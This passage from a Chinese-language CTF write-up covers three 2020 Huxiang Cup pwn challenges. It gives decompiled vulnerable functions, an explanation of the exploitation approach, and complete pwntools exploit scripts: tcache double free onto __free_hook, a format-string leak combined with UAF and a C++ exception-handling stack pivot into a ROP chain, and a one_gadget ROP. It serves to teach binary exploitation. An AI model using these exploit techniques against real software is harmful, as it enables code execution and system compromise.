class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">ch</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>():</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># step1 leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#unsortbin</span></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#unsortbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)<span class="comment"># leak main_arena</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x3ebe90</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 让chunk3 pre_size为0x200 </span></span><br><span class="line">new()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#7</span></span><br><span class="line">new()<span class="comment">#8</span></span><br><span class="line">new()<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># step3 chunk3 inuse为0</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 double free tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xf8</span>,p64(free_hook))</span><br><span class="line">new()</span><br><span class="line">new()</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xf8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><blockquote><p>题目的原型题目是<a href="https://www.anquanke.com/post/id/89855">2017 DCTF flex</a></p></blockquote><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>增删查功能，堆数量限制为 2 个，且释放堆不会减少计数标志位。有一个隐藏的菜单选项，查找资料后是确定是 c++ 的异常处理。IDA 反汇编后伪 C 看不到 try  catch 捕获异常结构，需要看汇编。</p><blockquote><p><a href="https://www.runoob.com/cplusplus/cpp-exceptions-handling.html">https://www.runoob.com/cplusplus/cpp-exceptions-handling.html</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_1184</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input what you want:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_E22(&amp;v2, <span class="number">40LL</span>) &gt; <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_QWORD *)_cxa_allocate_exception(<span class="number">8LL</span>, <span class="number">40LL</span>);<span class="comment">//会申请0x90堆存放错误信息v0</span></span><br><span class="line">    *v0 = <span class="string">&quot;You are too young!&quot;</span>;</span><br><span class="line">    _cxa_throw(v0, &amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="keyword">char</span> <span class="keyword">const</span>*, <span class="number">0LL</span>);<span class="comment">//调试后发现这里也会申请一大堆堆块</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当捕捉到错误后，就会停止剩下操作，直接跳转回 catch 错误处理。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>输出用户名时的格式化字符串：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_116C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(byte_202080);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放堆块时 UAF ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1025</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index&gt;&quot;</span>);</span><br><span class="line">  v1 = sub_EA2();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Insufficient space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( qword_202090[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_202090[v1]);<span class="comment">//UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;down!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>hint 函数写入存在栈溢出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_1184</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input what you want:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_E22(&amp;v2, <span class="number">40LL</span>) &gt; <span class="number">16</span> )<span class="comment">//</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_QWORD *)_cxa_allocate_exception(<span class="number">8LL</span>, <span class="number">40LL</span>);</span><br><span class="line">    *v0 = <span class="string">&quot;You are too young!&quot;</span>;</span><br><span class="line">    _cxa_throw(v0, &amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="keyword">char</span> <span class="keyword">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>格式化字符串泄露栈上的 libc_start_main 获取 libc_base</li><li>写入 ROP 利用链；利用 UAF 泄露堆地址</li><li>溢出修改 ebp ，利用异常处理机制控制栈到堆上 ROP </li></ol><p>正常泄露地址，只是用 vmmap 查地址算偏移会查到两个 libc.so 用高地址那个，或者用 libc 查 libc_start_main 偏移也用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%11$p&#x27;</span>)<span class="comment">#leak libc_base</span></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Current user:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>ROP 利用链用的是 libc 的 gadget ，程序开了 PIE ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ret = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">str_binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = p64(ret)+p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span><br></pre></td></tr></table></figure><p>申请两个堆然后释放用 UAF 泄露堆地址，申请的时候要将 ROP 利用链一起写入，ROP 链要填 0x18 填充后面记录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1:&quot;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>然后就是利用异常处理机制，具体研究看一开始放的原题。首先会由 <code>cxa_allocate_exception</code> 创建一个异常对象，会申请一个 0x90 堆。接着进入到 <code>cxa_throw</code> 函数，在里面的 <code>Unwind_RaiseException()</code> 将控制权转移到对应（跳转） catch 代码，执行完异常处理后就会执行 <code>leave;ret</code> ，**跳转到 catch 时依然保持跳转前的 rbp **。</p><p>通过劫持异常出现前的 rbp ，异常处理完成后执行 <code>leave;ret</code> 将栈劫持到堆中。</p><blockquote><p>gdb 单步调试到 <code>Unwind_RaiseException()</code> 后面就会直接跳过，也就是看不到 catch 执行情况</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(heap_addr+<span class="number">0x20</span>)[<span class="number">0</span>:<span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>ROP 链要填 0x18 再写有效部分是因为 <code>Unwind_RaiseException()</code> 执行完后查看堆会发现多了一堆，其中就有将 ROP 所在堆申请利用了，也就是覆盖了数据，所以要填个偏移，然后利用链没有被新数据覆盖。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./blend_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./blend_pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%11$p&#x27;</span>)<span class="comment">#leak libc_base</span></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Current user:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">str_binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = p64(ret)+p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1:&quot;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0x11e9)&#x27;)</span></span><br><span class="line"></span><br><span class="line">hint(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(heap_addr+<span class="number">0x20</span>)[<span class="number">0</span>:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><p>开局程序先 mmap 一块 rw 权限内存，放入一堆格式化字符串，然后输入 16 个数字，就会进入 sprintf 的循环，将数字与格式化字符串运算后放入对应变量寄存器。if 判断 v12 的值，v12 作为参数传入 read 函数，写入位置有点奇妙直接就是 rbp ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_4007C6</span><span class="params">(<span class="keyword">unsigned</span> __int16 v12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">2</span> * v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时这里就可能会造成溢出。</p><p>sprintf 里面应该是控制 v12 的值，要逆出来难度不小，最后看师傅们 wp ，当前 9 个输入数字为 32 时，v12 变成允许的最大值 0x20 。然后就是 ROP 了，ROP 回 main 会在 sprintf 报错，返回 sub_4007C6 则没有问题，但是只能输入 0xe 。最后解决办法是用一个 gadget <code>add eax, 0x20290e ; add ebx, esi ; ret</code>  控制 eax 的值，调到输入长度。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">p = process(<span class="string">&quot;./pwn_printf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn_printf&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;interesting\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">p.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401213</span></span><br><span class="line">rop_addr = <span class="number">0x040117f</span></span><br><span class="line">add_eax_0x20290e_ret = <span class="number">0x0000000000400794</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(add_eax_0x20290e_ret)+p64(rop_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x04007E7&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x4527a</span>)<span class="comment">#p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">26 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/221334">2020 湖湘杯 PWN WriteUp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
